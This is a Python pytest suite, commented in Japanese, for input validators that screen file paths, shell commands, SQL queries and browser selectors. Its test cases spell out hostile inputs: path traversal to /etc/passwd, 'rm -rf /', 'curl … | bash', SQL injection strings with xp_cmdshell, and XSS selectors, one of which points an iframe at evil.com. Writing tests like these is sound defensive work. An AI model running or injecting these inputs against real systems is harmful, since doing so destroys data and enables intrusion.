"""
validators.py のテストスイート
"""

import pytest
import sys
from pathlib import Path

# validators モジュールのインポートパスを追加
sys.path.insert(0, str(Path(__file__).parent))

from validators import (
    validate_browser_selector,
    validate_cli_command,
    validate_db_query,
    validate_file_operation,
)


# ============================================================================
# validate_file_operation テスト
# ============================================================================


class TestValidateFileOperation:
    """ファイル操作バリデーションのテストクラス"""

    def test_valid_file_path(self):
        """有効なパスは成功する"""
        valid, msg = validate_file_operation("/tmp/test.txt", "read")
        assert valid is True
        assert msg == ""

    def test_path_traversal_detection(self):
        """パストラバーサル（..）を検出"""
        valid, msg = validate_file_operation("../../../etc/passwd", "read")
        assert valid is False
        assert "パストラバーサル" in msg

    def test_protocol_handler_file(self):
        """file:// プロトコルを検出"""
        valid, msg = validate_file_operation("file:///etc/passwd", "read")
        assert valid is False
        assert "プロトコル" in msg or "file://" in msg

    def test_protocol_handler_ftp(self):
        """ftp:// プロトコルを検出"""
        valid, msg = validate_file_operation("ftp://example.com/file.txt", "read")
        assert valid is False
        assert "プロトコル" in msg

    def test_multiple_path_traversal(self):
        """複数の ../ を検出"""
        valid, msg = validate_file_operation("../.././../../sensitive", "write")
        assert valid is False

    def test_empty_path(self):
        """空のパスはエラー"""
        valid, msg = validate_file_operation("", "read")
        assert valid is False
        assert "指定されていません" in msg


# ============================================================================
# validate_cli_command テスト
# ============================================================================


class TestValidateCliCommand:
    """CLI コマンドバリデーションのテストクラス"""

    def test_valid_command(self):
        """有効なコマンドは成功"""
        valid, msg = validate_cli_command("npm run build")
        assert valid is True

    def test_rm_rf_injection(self):
        """rm -rf による削除コマンドを検出"""
        valid, msg = validate_cli_command("npm run build && rm -rf /")
        assert valid is False
        assert "危険" in msg or "rm" in msg

    def test_pipe_injection(self):
        """パイプによるコマンド注入を検出"""
        valid, msg = validate_cli_command("echo test | rm -rf /tmp")
        assert valid is False
        assert "検出" in msg or "危険" in msg

    def test_sql_drop_injection(self):
        """SQL DROP を検出"""
        valid, msg = validate_cli_command("query; DROP TABLE users")
        assert valid is False
        assert "DROP" in msg or "検出" in msg

    def test_curl_pipe_bash(self):
        """curl | bash パターンを検出"""
        valid, msg = validate_cli_command("curl http://example.com/script.sh | bash")
        assert valid is False
        assert "コード実行" in msg or "検出" in msg

    def test_empty_command(self):
        """空のコマンドはエラー"""
        valid, msg = validate_cli_command("")
        assert valid is False
        assert "指定されていません" in msg


# ============================================================================
# validate_db_query テスト
# ============================================================================


class TestValidateDbQuery:
    """DB クエリバリデーションのテストクラス"""

    def test_valid_select_query(self):
        """有効な SELECT クエリは成功"""
        valid, msg = validate_db_query("SELECT * FROM users WHERE id = ?", {})
        assert valid is True

    def test_drop_table_detection(self):
        """DROP TABLE を検出"""
        valid, msg = validate_db_query("DROP TABLE users", {})
        assert valid is False
        assert "DROP" in msg

    def test_or_1_equals_1_injection(self):
        """OR 1=1 インジェクションを検出"""
        valid, msg = validate_db_query("SELECT * FROM users WHERE id = ? OR '1'='1", {})
        assert valid is False
        assert "OR" in msg or "検出" in msg or "インジェクション" in msg

    def test_union_select_injection(self):
        """UNION SELECT インジェクションを検出"""
        valid, msg = validate_db_query(
            "SELECT * FROM users UNION SELECT * FROM admin", {}
        )
        assert valid is False
        assert "UNION" in msg

    def test_xp_cmdshell_detection(self):
        """xp_cmdshell を検出"""
        valid, msg = validate_db_query("EXEC xp_cmdshell 'dir'", {})
        assert valid is False
        assert "xp_cmdshell" in msg or "検出" in msg

    def test_invalid_param_type(self):
        """パラメータの型チェック（list はエラー）"""
        valid, msg = validate_db_query(
            "SELECT * FROM users WHERE id = ?", {"id": [1, 2, 3]}
        )
        assert valid is False
        assert "型が無効" in msg or "型" in msg

    def test_valid_param_types(self):
        """有効なパラメータ型（str, int, float, bool）は成功"""
        valid, msg = validate_db_query(
            "SELECT * FROM users WHERE id = ? AND active = ?",
            {"id": 123, "active": True},
        )
        assert valid is True

    def test_empty_query(self):
        """空のクエリはエラー"""
        valid, msg = validate_db_query("", {})
        assert valid is False


# ============================================================================
# validate_browser_selector テスト
# ============================================================================


class TestValidateBrowserSelector:
    """ブラウザセレクタバリデーションのテストクラス"""

    def test_valid_css_selector(self):
        """有効な CSS セレクタは成功"""
        valid, msg = validate_browser_selector("button.primary-btn")
        assert valid is True

    def test_valid_id_selector(self):
        """有効な ID セレクタは成功"""
        valid, msg = validate_browser_selector("#submit-button")
        assert valid is True

    def test_script_tag_detection(self):
        """<script> タグを検出"""
        valid, msg = validate_browser_selector("<script>alert(1)</script>")
        assert valid is False
        assert "script" in msg.lower()

    def test_onerror_handler_detection(self):
        """onerror イベントハンドラを検出"""
        valid, msg = validate_browser_selector("img[onerror='alert(1)']")
        assert valid is False
        assert "onerror" in msg.lower()

    def test_javascript_protocol_detection(self):
        """javascript: プロトコルハンドラを検出"""
        valid, msg = validate_browser_selector("a[href='javascript:void(0)']")
        assert valid is False
        assert "javascript" in msg.lower()

    def test_onclick_handler_detection(self):
        """onclick イベントハンドラを検出"""
        valid, msg = validate_browser_selector("div[onclick='malicious()']")
        assert valid is False
        assert "onclick" in msg.lower()

    def test_iframe_detection(self):
        """<iframe> タグを検出"""
        valid, msg = validate_browser_selector(
            "<iframe src='https://evil.com'></iframe>"
        )
        assert valid is False
        assert "iframe" in msg.lower()

    def test_empty_selector(self):
        """空のセレクタはエラー"""
        valid, msg = validate_browser_selector("")
        assert valid is False
        assert "指定されていません" in msg


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
